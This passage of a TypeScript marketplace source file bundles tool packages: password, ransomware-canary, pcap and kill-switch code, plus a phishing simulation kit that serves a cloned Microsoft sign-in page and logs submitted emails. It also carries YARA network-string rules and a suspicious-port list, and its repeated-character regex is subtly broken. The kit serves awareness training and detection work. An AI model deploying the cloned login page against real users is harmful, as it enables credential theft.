    meta:
        description = "Detects network-related strings"
    strings:
        $n1 = "socket" nocase
        $n2 = "connect" nocase
        $n3 = "recv" nocase
        $n4 = "send" nocase
        $n5 = "WSAStartup"
    condition:
        3 of them
}
`,
    "requirements.txt": "yara-python>=4.3.0\npefile>=2023.2.7\nrequests>=2.31.0\n",
  },

  // ── 21. Password Strength Analyzer ───────────────────────────────────────
  "password-analyzer": {
    "README.md": `# Password Strength Analyzer & Secure Generator\n\nEntropy calculation, zxcvbn-style scoring, breach database checking, and NIST-compliant generation.\n\n## Quick Start\n\`\`\`bash\npython3 password_analyzer.py --check "MyP@ssw0rd"\npython3 password_analyzer.py --generate --length 24 --type passphrase\n\`\`\``,
    "password_analyzer.py": `#!/usr/bin/env python3
"""Password Strength Analyzer & Secure Generator — entropy, breach check, NIST generation."""
import argparse, hashlib, math, os, re, secrets, string, urllib.request

COMMON_PASSWORDS = {
    "password","123456","password1","qwerty","abc123","letmein","monkey","1234567890",
    "password123","iloveyou","admin","welcome","login","pass","master","dragon",
    "superman","batman","trustno1","sunshine","princess","football","shadow",
}

WORDLIST = [
    "correct","horse","battery","staple","cloud","river","forest","mountain",
    "ocean","thunder","silver","golden","crystal","dragon","phoenix","falcon",
    "tiger","eagle","wolf","bear","storm","fire","ice","wind","earth","star",
    "moon","sun","dawn","dusk","peak","valley","bridge","tower","castle","garden",
    "winter","summer","autumn","spring","north","south","east","west","bright",
    "swift","brave","calm","deep","free","grand","high","long","pure","true",
]

def entropy(password: str) -> float:
    charset = 0
    if re.search(r"[a-z]", password): charset += 26
    if re.search(r"[A-Z]", password): charset += 26
    if re.search(r"[0-9]", password): charset += 10
    if re.search(r"[^a-zA-Z0-9]", password): charset += 32
    return len(password) * math.log2(charset) if charset else 0

def score(password: str) -> dict:
    e = entropy(password)
    issues: list[str] = []
    if len(password) < 12:   issues.append("Too short (min 12 chars)")
    if not re.search(r"[A-Z]", password): issues.append("No uppercase letter")
    if not re.search(r"[0-9]", password): issues.append("No digit")
    if not re.search(r"[^a-zA-Z0-9]", password): issues.append("No special character")
    if password.lower() in COMMON_PASSWORDS: issues.append("Common password!")
    if re.search(r"(.)\x01{2,}", password): issues.append("Repeated characters")
    if re.search(r"(012|123|234|345|456|567|678|789|890|abc|qwerty)", password.lower()):
        issues.append("Sequential pattern detected")

    if e >= 80 and not issues:   strength = "VERY STRONG"
    elif e >= 60 and len(issues) <= 1: strength = "STRONG"
    elif e >= 40 and len(issues) <= 2: strength = "MODERATE"
    elif e >= 25: strength = "WEAK"
    else:         strength = "VERY WEAK"

    crack_times = {
        "online_throttled": f"{2**e / 100:.0e} seconds",
        "offline_fast_gpu": f"{2**e / 1e12:.0e} seconds",
        "bcrypt_1000":      f"{2**e / 1000:.0e} seconds",
    }
    return {"password": "***", "entropy_bits": round(e, 1), "strength": strength,
            "issues": issues, "crack_time_estimates": crack_times}

def check_breach(password: str) -> dict:
    """Check HaveIBeenPwned k-anonymity API."""
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    try:
        req = urllib.request.Request(
            f"https://api.pwnedpasswords.com/range/{prefix}",
            headers={"User-Agent": "TitanPasswordChecker/1.0"}
        )
        with urllib.request.urlopen(req, timeout=8) as r:
            body = r.read().decode()
        for line in body.splitlines():
            h, count = line.split(":")
            if h == suffix:
                return {"breached": True, "breach_count": int(count)}
        return {"breached": False, "breach_count": 0}
    except Exception as e:
        return {"breached": None, "error": str(e)}

def generate_password(length: int = 20, ptype: str = "random") -> str:
    if ptype == "passphrase":
        words = [secrets.choice(WORDLIST) for _ in range(4)]
        return "-".join(words) + "-" + str(secrets.randbelow(9999)).zfill(4)
    if ptype == "pronounceable":
        consonants = "bcdfghjklmnpqrstvwxyz"
        vowels     = "aeiou"
        pw = ""
        for _ in range(length // 2):
            pw += secrets.choice(consonants) + secrets.choice(vowels)
        pw += str(secrets.randbelow(99))
        return pw[:length]
    # Random
    chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
    while True:
        pw = "".join(secrets.choice(chars) for _ in range(length))
        if (re.search(r"[A-Z]", pw) and re.search(r"[a-z]", pw)
                and re.search(r"[0-9]", pw) and re.search(r"[^a-zA-Z0-9]", pw)):
            return pw

def main():
    ap = argparse.ArgumentParser(description="Password Strength Analyzer")
    ap.add_argument("--check",    help="Password to analyze")
    ap.add_argument("--breach",   action="store_true", help="Check HaveIBeenPwned")
    ap.add_argument("--generate", action="store_true", help="Generate secure password")
    ap.add_argument("--length",   type=int, default=20)
    ap.add_argument("--type",     choices=["random","passphrase","pronounceable"], default="random")
    ap.add_argument("--count",    type=int, default=1)
    args = ap.parse_args()
    if args.generate:
        for _ in range(args.count):
            pw = generate_password(args.length, args.type)
            s  = score(pw)
            print(f"  {pw}  [{s['strength']} — {s['entropy_bits']} bits]")
    elif args.check:
        import json
        s = score(args.check)
        print(json.dumps(s, indent=2))
        if args.breach:
            b = check_breach(args.check)
            print(json.dumps(b, indent=2))
    else:
        ap.print_help()

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 22. Ransomware Defense Playbook ──────────────────────────────────────
  "ransomware-defense": {
    "README.md": `# Ransomware Defense & Recovery Playbook\n\nDetection rules (Sigma/YARA), backup verification, incident response procedures, and automated recovery scripts.\n\n## Quick Start\n\`\`\`bash\npython3 canary_deploy.py --dir /important/files\npython3 backup_verify.py --backup-dir /backups --restore-test\n\`\`\``,
    "canary_deploy.py": `#!/usr/bin/env python3
"""Deploy canary files to detect ransomware encryption activity."""
import argparse, hashlib, json, os, time, watchdog.events, watchdog.observers  # type: ignore

CANARY_CONTENT = b"TITAN_CANARY_FILE_DO_NOT_MODIFY_OR_ENCRYPT_" + os.urandom(32)

class CanaryHandler(watchdog.events.FileSystemEventHandler):
    def __init__(self, canary_paths: list[str]):
        self.canary_paths = set(canary_paths)
        self.alerts: list[dict] = []

    def on_modified(self, event):
        if event.src_path in self.canary_paths:
            alert = {"type": "CANARY_MODIFIED", "path": event.src_path,
                     "time": time.time(), "severity": "CRITICAL"}
            self.alerts.append(alert)
            print(f"[!!!] RANSOMWARE ALERT: Canary file modified: {event.src_path}")

    def on_deleted(self, event):
        if event.src_path in self.canary_paths:
            alert = {"type": "CANARY_DELETED", "path": event.src_path,
                     "time": time.time(), "severity": "CRITICAL"}
            self.alerts.append(alert)
            print(f"[!!!] RANSOMWARE ALERT: Canary file deleted: {event.src_path}")

def deploy_canaries(directory: str, count: int = 5) -> list[str]:
    paths = []
    for i in range(count):
        path = os.path.join(directory, f".titan_canary_{i:03d}.dat")
        with open(path, "wb") as f:
            f.write(CANARY_CONTENT)
        paths.append(path)
        print(f"[+] Canary deployed: {path}")
    return paths

def main():
    ap = argparse.ArgumentParser(description="Ransomware Canary Deployment")
    ap.add_argument("--dir",   required=True, help="Directory to protect")
    ap.add_argument("--count", type=int, default=5, help="Number of canary files")
    ap.add_argument("--watch", action="store_true", help="Watch for modifications")
    args = ap.parse_args()
    canaries = deploy_canaries(args.dir, args.count)
    if args.watch:
        print(f"[*] Watching {args.dir} for canary modifications (Ctrl+C to stop)...")
        handler  = CanaryHandler(canaries)
        observer = watchdog.observers.Observer()
        observer.schedule(handler, args.dir, recursive=False)
        observer.start()
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            observer.stop()
        observer.join()
        if handler.alerts:
            print(json.dumps(handler.alerts, indent=2))

if __name__ == "__main__":
    main()
`,
    "backup_verify.py": `#!/usr/bin/env python3
"""Backup integrity verification and restore testing."""
import argparse, hashlib, json, os, shutil, tempfile, time

def hash_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()

def verify_backup(backup_dir: str) -> dict:
    print(f"[*] Verifying backup: {backup_dir}")
    results: dict = {"backup_dir": backup_dir, "files": [], "errors": []}
    manifest_path = os.path.join(backup_dir, "manifest.json")
    if os.path.exists(manifest_path):
        with open(manifest_path) as f:
            manifest = json.load(f)
        for entry in manifest.get("files", []):
            path = os.path.join(backup_dir, entry["path"])
            if not os.path.exists(path):
                results["errors"].append(f"Missing: {entry['path']}")
                continue
            actual_hash = hash_file(path)
            if actual_hash != entry["hash"]:
                results["errors"].append(f"Hash mismatch: {entry['path']}")
            else:
                results["files"].append({"path": entry["path"], "status": "OK"})
    else:
        # No manifest — just count files
        for root, _, files in os.walk(backup_dir):
            for fname in files:
                fpath = os.path.join(root, fname)
                results["files"].append({"path": fpath, "hash": hash_file(fpath)})
    results["total_files"] = len(results["files"])
    results["errors_count"] = len(results["errors"])
    return results

def main():
    ap = argparse.ArgumentParser(description="Backup Verification")
    ap.add_argument("--backup-dir",   required=True)
    ap.add_argument("--restore-test", action="store_true")
    ap.add_argument("--output",       help="Output JSON")
    args = ap.parse_args()
    results = verify_backup(args.backup_dir)
    if args.restore_test:
        with tempfile.TemporaryDirectory() as tmp:
            t0 = time.time()
            shutil.copytree(args.backup_dir, os.path.join(tmp, "restore"), dirs_exist_ok=True)
            elapsed = time.time() - t0
            results["restore_test"] = {"status": "OK", "time_s": round(elapsed, 2)}
            print(f"[+] Restore test: {elapsed:.1f}s")
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "watchdog>=3.0.0\n",
  },

  // ── 23. Phishing Simulation Kit ───────────────────────────────────────────
  "phishing-sim": {
    "README.md": `# Phishing Simulation Kit\n\nAuthorised phishing awareness training: campaign management, credential capture page, click tracking, and awareness report.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 phishing_server.py --port 8080 --template office365\npython3 report.py --log phishing.log --output awareness_report.json\n\`\`\`${LEGAL}`,
    "phishing_server.py": `#!/usr/bin/env python3
"""Phishing Simulation Server — for authorised security awareness training ONLY."""
import argparse, json, logging, os, time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
log = logging.getLogger(__name__)

TEMPLATES = {
    "office365": """<!DOCTYPE html>
<html><head><title>Sign in to your account</title>
<style>body{font-family:Segoe UI,sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
h1{font-size:24px;font-weight:600;margin-bottom:16px}
input{width:100%;padding:8px;margin:8px 0;border:1px solid #ccc;font-size:15px;box-sizing:border-box}
button{background:#0067b8;color:#fff;border:none;padding:10px;width:100%;font-size:15px;cursor:pointer;margin-top:12px}
</style></head>
<body><div class="box">
<h1>Sign in</h1>
<p>Use your Microsoft account</p>
<form method="POST" action="/capture">
<input name="email" type="email" placeholder="Email, phone, or Skype" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign in</button>
</form></div></body></html>""",
    "generic": """<!DOCTYPE html>
<html><head><title>Login</title></head>
<body><h2>Login</h2>
<form method="POST" action="/capture">
<input name="email" type="email" placeholder="Email" required><br>
<input name="password" type="password" placeholder="Password" required><br>
<button type="submit">Login</button>
</form></body></html>""",
}

AWARENESS_PAGE = """<!DOCTYPE html>
<html><head><title>Security Awareness Training</title></head>
<body style="font-family:Arial;max-width:600px;margin:40px auto;padding:20px">
<h1 style="color:#d32f2f">⚠️ You clicked a phishing link!</h1>
<p>This was a <strong>simulated phishing test</strong> conducted by your security team.</p>
<h2>What happened?</h2>
<p>You clicked a link in a simulated phishing email and entered your credentials on a fake login page.</p>
<h2>What to do next</h2>
<ul>
<li>Never enter credentials on unexpected login pages</li>
<li>Always verify the URL before logging in</li>
<li>Report suspicious emails to your security team</li>
<li>Enable multi-factor authentication on all accounts</li>
</ul>
<p><a href="https://www.phishing.org/phishing-techniques">Learn more about phishing</a></p>
</body></html>"""

class PhishingHandler(BaseHTTPRequestHandler):
    template: str = "office365"
    log_file: str = "phishing.log"

    def log_message(self, fmt, *args):
        pass  # suppress default logging

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        html = TEMPLATES.get(self.template, TEMPLATES["generic"])
        self.wfile.write(html.encode())
        log.info(f"[CLICK] {self.client_address[0]} - {self.path}")
        with open(self.log_file, "a") as f:
            f.write(json.dumps({"event": "click", "ip": self.client_address[0],
                                 "path": self.path, "ts": time.time()}) + "\\n")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode()
        params = parse_qs(body)
        email  = params.get("email", [""])[0]
        log.info(f"[CRED] {self.client_address[0]} submitted: {email}")
        with open(self.log_file, "a") as f:
            f.write(json.dumps({"event": "credential", "ip": self.client_address[0],
                                 "email": email, "ts": time.time()}) + "\\n")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(AWARENESS_PAGE.encode())

def main():
    ap = argparse.ArgumentParser(description="Phishing Simulation Server")
    ap.add_argument("--port",     type=int, default=8080)
    ap.add_argument("--template", choices=list(TEMPLATES.keys()), default="office365")
    ap.add_argument("--log",      default="phishing.log")
    args = ap.parse_args()
    PhishingHandler.template = args.template
    PhishingHandler.log_file = args.log
    server = HTTPServer(("", args.port), PhishingHandler)
    log.info(f"[*] Phishing simulation server on port {args.port} (template: {args.template})")
    log.info(f"[*] Logging to: {args.log}")
    log.info("[*] Ctrl+C to stop")
    server.serve_forever()

if __name__ == "__main__":
    main()
`,
    "report.py": `#!/usr/bin/env python3
"""Generate phishing awareness campaign report from log file."""
import argparse, json

def main():
    ap = argparse.ArgumentParser(description="Phishing Campaign Report")
    ap.add_argument("--log",    required=True)
    ap.add_argument("--output", help="Output JSON")
    args = ap.parse_args()
    clicks, creds = [], []
    with open(args.log) as f:
        for line in f:
            try:
                e = json.loads(line)
                if e["event"] == "click":      clicks.append(e)
                elif e["event"] == "credential": creds.append(e)
            except Exception:
                pass
    unique_ips = len(set(e["ip"] for e in clicks))
    report = {
        "total_clicks":       len(clicks),
        "unique_ips":         unique_ips,
        "credentials_entered": len(creds),
        "click_rate_pct":     round(len(clicks) / max(1, unique_ips) * 100, 1),
        "credential_rate_pct": round(len(creds) / max(1, len(clicks)) * 100, 1),
        "unique_emails":      list(set(e.get("email","") for e in creds)),
    }
    if args.output:
        with open(args.output, "w") as f: json.dump(report, f, indent=2)
    print(json.dumps(report, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "# No external dependencies — stdlib only\n",
  },

  // ── 24. Network Traffic Analyzer ─────────────────────────────────────────
  "network-analyzer": {
    "README.md": `# Network Traffic Analyzer\n\nPCAP analysis, protocol dissection, anomaly detection, and IOC extraction from network captures.\n\n## Quick Start\n\`\`\`bash\npip install -r requirements.txt\npython3 pcap_analyzer.py --file capture.pcap\npython3 pcap_analyzer.py --file capture.pcap --output analysis.json\n\`\`\``,
    "pcap_analyzer.py": `#!/usr/bin/env python3
"""Network Traffic Analyzer — PCAP analysis, protocol dissection, anomaly detection."""
import argparse, json, sys

def analyze_pcap(path: str) -> dict:
    try:
        from scapy.all import rdpcap, IP, TCP, UDP, DNS, HTTP  # type: ignore
    except ImportError:
        print("[!] pip install scapy")
        sys.exit(1)

    print(f"[*] Loading: {path}")
    packets = rdpcap(path)
    print(f"[*] Loaded {len(packets)} packets")

    stats: dict = {
        "total_packets": len(packets),
        "protocols":     {},
        "top_talkers":   {},
        "dns_queries":   [],
        "http_hosts":    [],
        "anomalies":     [],
    }

    ip_counts: dict[str, int] = {}
    port_counts: dict[int, int] = {}

    for pkt in packets:
        # Protocol counting
        if pkt.haslayer("IP"):
            src = pkt["IP"].src
            ip_counts[src] = ip_counts.get(src, 0) + 1
        if pkt.haslayer("TCP"):
            stats["protocols"]["TCP"] = stats["protocols"].get("TCP", 0) + 1
            dport = pkt["TCP"].dport
            port_counts[dport] = port_counts.get(dport, 0) + 1
        elif pkt.haslayer("UDP"):
            stats["protocols"]["UDP"] = stats["protocols"].get("UDP", 0) + 1
        elif pkt.haslayer("ICMP"):
            stats["protocols"]["ICMP"] = stats["protocols"].get("ICMP", 0) + 1

        # DNS queries
        if pkt.haslayer("DNS") and pkt["DNS"].qr == 0:
            try:
                qname = pkt["DNS"].qd.qname.decode("utf-8", errors="ignore").rstrip(".")
                if qname and qname not in stats["dns_queries"]:
                    stats["dns_queries"].append(qname)
            except Exception:
                pass

    # Top talkers
    stats["top_talkers"] = dict(sorted(ip_counts.items(), key=lambda x: x[1], reverse=True)[:10])

    # Anomaly detection
    # Port scan detection: many ports from one IP
    for ip, count in ip_counts.items():
        if count > 100:
            stats["anomalies"].append({"type": "High traffic source", "ip": ip,
                                        "packets": count, "severity": "MEDIUM"})

    # Common malicious ports
    malicious_ports = {4444: "Metasploit default", 1337: "Leet/backdoor",
                       31337: "Elite backdoor", 6666: "IRC/botnet", 6667: "IRC/botnet"}
    for port, desc in malicious_ports.items():
        if port_counts.get(port, 0) > 0:
            stats["anomalies"].append({"type": "Suspicious port", "port": port,
                                        "desc": desc, "count": port_counts[port],
                                        "severity": "HIGH"})

    stats["dns_queries"] = stats["dns_queries"][:50]
    return stats

def main():
    ap = argparse.ArgumentParser(description="Network Traffic Analyzer")
    ap.add_argument("--file",   required=True, help="PCAP file")
    ap.add_argument("--output", help="Output JSON")
    args = ap.parse_args()
    results = analyze_pcap(args.file)
    if args.output:
        with open(args.output, "w") as f: json.dump(results, f, indent=2)
        print(f"[*] Saved to {args.output}")
    else:
        print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()
`,
    "requirements.txt": "scapy>=2.5.0\n",
  },

  // ── 25. Kill Switch Module ────────────────────────────────────────────────
  "kill-switch": {
    "README.md": `# Kill Switch — Emergency Automation Control\n\nInstantly halt all running Archibald Titan automations with a secure 10-digit code.\n\n## How It Works\n1. Install from the Grand Bazaar\n2. A unique 10-digit kill switch code is generated for your account\n3. Enter the code to activate — all automations halt immediately\n4. Enter the code again to deactivate\n5. Reset the code at any time\n\n## Integration\nOnce installed, the Kill Switch integrates with:\n- Fetcher Engine\n- SEO Command Center\n- Affiliate Engine\n- Pre-flight safety checks\n`,
    "kill_switch.ts": `/**
 * Kill Switch Module — Emergency Automation Control
 * Integrates with Archibald Titan's automation engine.
 */
export interface KillSwitchState {
  active: boolean;
  code: string;
  activatedAt: Date | null;
  activatedBy: string | null;
}

export function generateKillSwitchCode(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let code = "";
  const array = new Uint8Array(10);
  crypto.getRandomValues(array);
  for (const byte of array) {
    code += chars[byte % chars.length];
  }
  return code;
}

export function activateKillSwitch(
  state: KillSwitchState,
  inputCode: string,
  userId: string
): { success: boolean; message: string; newState: KillSwitchState } {
  if (inputCode !== state.code) {
    return { success: false, message: "Invalid kill switch code", newState: state };
  }
  if (state.active) {
    const newState: KillSwitchState = {
      ...state,
      active: false,
      activatedAt: null,
      activatedBy: null,
    };
    return { success: true, message: "Kill switch deactivated — automations resumed", newState };
  }
  const newState: KillSwitchState = {
    ...state,
    active: true,
    activatedAt: new Date(),
    activatedBy: userId,
  };
  return { success: true, message: "Kill switch activated — all automations halted", newState };
}

export function resetKillSwitchCode(state: KillSwitchState): KillSwitchState {
  return { ...state, code: generateKillSwitchCode() };
}
`,
    "README_INTEGRATION.md": `# Kill Switch Integration Guide\n\n## Pre-flight Check\nAdd this to every automation before starting:\n\n\`\`\`typescript\nimport { getKillSwitchState } from "./kill-switch-store";\n\nasync function preflightCheck(userId: string): Promise<void> {\n  const state = await getKillSwitchState(userId);\n  if (state?.active) {\n    throw new Error("Kill switch is active — automation blocked");\n  }\n}\n\`\`\`\n\n## Cancel Running Jobs\n\`\`\`typescript\nimport { cancelAllJobs } from "./job-queue";\n\nasync function onKillSwitchActivated(userId: string): Promise<void> {\n  await cancelAllJobs({ userId, reason: "kill_switch" });\n  await clearActiveSessions(userId);\n}\n\`\`\`\n`,
  },
};

// ─── Zip Builder ──────────────────────────────────────────────────────────────

async function buildZip(files: Record<string, string>): Promise<Buffer> {
  const zip = new JSZip();
  for (const [name, content] of Object.entries(files)) {
    zip.file(name, content);
  }
  const result = await zip.generateAsync({ type: "nodebuffer" as any, compression: "DEFLATE" });
  return result as unknown as Buffer;
}

// ─── Payload Key Resolver ─────────────────────────────────────────────────────

function resolvePayloadKey(title: string): string | null {
  const t = title.toLowerCase();
  if (t.includes("reverse shell"))                return "reverse-shell";
  if (t.includes("web vulnerability") || t.includes("vuln scan")) return "vuln-scanner";
  if (t.includes("osint"))                        return "osint-toolkit";
  if (t.includes("privilege escalation") && t.includes("linux")) return "privesc-toolkit";
  if (t.includes("sql injection"))                return "sql-injection";
  if (t.includes("xss") || t.includes("cross-site scripting"))  return "xss-hunter";
  if (t.includes("port scan") || t.includes("network recon"))   return "port-scanner";
  if (t.includes("wifi") || t.includes("wi-fi") || t.includes("wireless")) return "wifi-pentest";
  if (t.includes("waf bypass"))                   return "waf-bypass";
  if (t.includes("crypto arbitrage"))             return "crypto-arbitrage";
  if (t.includes("ai chatbot") || t.includes("chatbot framework")) return "ai-chatbot";
  if (t.includes("smart contract"))               return "smart-contract";
  if (t.includes("seo automation") || t.includes("seo suite"))  return "seo-automation";
  if (t.includes("email campaign"))               return "email-campaign";
  if (t.includes("api security"))                 return "api-security";
  if (t.includes("iam") || t.includes("privilege escalation") && t.includes("cloud")) return "cloud-iam-scanner";
  if (t.includes("fine-tun") || t.includes("finetune") || t.includes("llm")) return "llm-finetune";
  if (t.includes("encrypt") || t.includes("e2e") || t.includes("end-to-end")) return "e2e-encryption";
  if (t.includes("docker") || t.includes("container escape"))   return "docker-scanner";
  if (t.includes("malware") || t.includes("sandbox"))           return "malware-sandbox";
  if (t.includes("password"))                     return "password-analyzer";
  if (t.includes("ransomware"))                   return "ransomware-defense";
  if (t.includes("phishing"))                     return "phishing-sim";
  if (t.includes("network traffic") || t.includes("pcap"))      return "network-analyzer";
  if (t.includes("kill switch"))                  return "kill-switch";
  return null;
}

// ─── Generic Fallback Payload ─────────────────────────────────────────────────

function buildGenericPayload(title: string, description: string, language: string): Record<string, string> {
  const ext = language.toLowerCase().includes("python") ? "py"
            : language.toLowerCase().includes("typescript") || language.toLowerCase().includes("javascript") ? "ts"
            : language.toLowerCase().includes("go") ? "go"
            : language.toLowerCase().includes("rust") ? "rs"
            : "sh";
  const mainFile = `main.${ext}`;
  return {
    "README.md": `# ${title}\n\n${description}\n\n## Installation\n\`\`\`bash\npip install -r requirements.txt\n\`\`\`\n\n## Usage\n\`\`\`bash\npython3 ${mainFile} --help\n\`\`\`\n`,
    [mainFile]: `# ${title}\n# ${description}\n\nprint("Module loaded: ${title}")\n`,
    "requirements.txt": "# Add dependencies here\n",
    "LICENSE": "MIT License\nCopyright (c) 2025 Archibald Titan Marketplace\n",
  };
}

// ─── Main Export ──────────────────────────────────────────────────────────────

export async function generateAndUploadPayload(listingId: number): Promise<string | null> {
  const db = await getDb();
  if (!db) return null;

  const [listing] = await db
    .select()
    .from(marketplaceListings)
    .where(eq(marketplaceListings.id, listingId))
    .limit(1);

  if (!listing) return null;

  const key = resolvePayloadKey(listing.title);
  const files = key && PAYLOADS[key]
    ? PAYLOADS[key]
    : buildGenericPayload(listing.title, listing.description, listing.language || "Python");

  const zipBuffer = await buildZip(files);
  const storageKey = `marketplace/payloads/${listing.uid}.zip`;

  try {
    await storagePut(storageKey, zipBuffer, "application/zip");
    await db
      .update(marketplaceListings)
      .set({ fileUrl: storageKey })
      .where(eq(marketplaceListings.id, listingId));
    return storageKey;
  } catch (err) {
    console.error("[PayloadGen] Upload failed:", err);
    return null;
  }
}

export async function generateAllMissingPayloads(): Promise<{ generated: number; failed: number }> {
  const db = await getDb();
  if (!db) return { generated: 0, failed: 0 };

  const listings = await db
    .select()
    .from(marketplaceListings)
    .where(eq(marketplaceListings.fileUrl, null as any));

  let generated = 0, failed = 0;
  for (const listing of listings) {
    const result = await generateAndUploadPayload(listing.id);
    if (result) generated++;
    else failed++;
  }
  return { generated, failed };
}
